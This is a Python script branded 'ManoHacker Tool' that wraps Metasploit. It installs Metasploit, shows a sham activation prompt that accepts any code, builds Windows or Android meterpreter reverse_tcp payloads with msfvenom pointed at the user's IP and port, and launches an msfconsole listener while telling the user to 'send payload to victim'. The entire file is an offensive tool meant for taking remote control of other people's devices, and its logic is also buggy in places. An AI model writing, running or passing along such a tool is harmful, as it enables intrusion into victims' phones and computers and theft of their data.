import os
os.system("clear")
os.system("apt-get install metasploit -y")
os.system("clear")

Activate = input ("Please Type Your Activation Code ==>  ")

if Activate == "A5DINVNDKSO9WE87FOKLO1":
    print ("Thanks For your Login ")

else:
    print ("Incorrect code Please Type Real Code : ")
    Activatee = input ("Type Your Activation Code : ")
    print ("Sucesfully Login..")

logo = '''
\033[1;36m███╗░░░███╗░█████╗░███╗░░██╗░█████╗░
████╗░████║██╔══██╗████╗░██║██╔══██╗
██╔████╔██║███████║██╔██╗██║██║░░██║
██║╚██╔╝██║██╔══██║██║╚████║██║░░██║
██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░     
                                                                                     
'''
print (logo)


print ('\033[1;31m >> Welcome For ManoHacker Tool !! >> Thanks For Your Login ! ..')
print ('============================================================')
print ("\033[1;31m | Choose Option")
print ('=============================================================')
print("\033[1;32m 1- | Payloads")
print("\033[1;32m 2- | Malwares (Maintenance)")

Option = input ("\033[1;33m Enter Your Option ===> : ")
print ('=======================================================')
if Option == "1":
    payload = input("\033[1;31mPAYLOAD TYPE ANDROID / WINDOWS : ")
os.system("ifconfig")
ip = input("\033[1;34m[===>] YOUR IP :  ")
port = input("\033[1;33m[===>] PORT ")
name = input("\033[1;36m[===>] Name For Payload :  ")
if payload == "windows":
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
elif payload == "android":
      os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
use = input("YOU USING KALI / TERMUX :  ")
if use == "termux" and payload == "windows":
    os.system("mv "+name+".exe /sdcard")
    print("-------------------------")
    print("payload save in sdcard")
    print("-------------------------")
elif use == "termux" and payload == "android":
      os.system("mv "+name+".apk /sdcard")
      print("-------------------------")
      print("payload save in sdcard")
      print("-------------------------")
if use == "kali" and payload == "windows":
    os.system("mv "+name+".exe /root/Desktop/")
    print("-------------------------")
    print("payload save in Desktop")
    print("-------------------------")
elif use == "kali" and payload == "android":
      os.system("mv "+name+".apk /root/Desktop/")
      print("-------------------------")
      print("payload save in Desktop")
      print("-------------------------")
you = input("You want listen in payload Y/n ? ")
if you == "n":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     os.system("ls")
if you == "N":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     os.system("ls")
elif you == "Y":
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
elif you == "y":
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')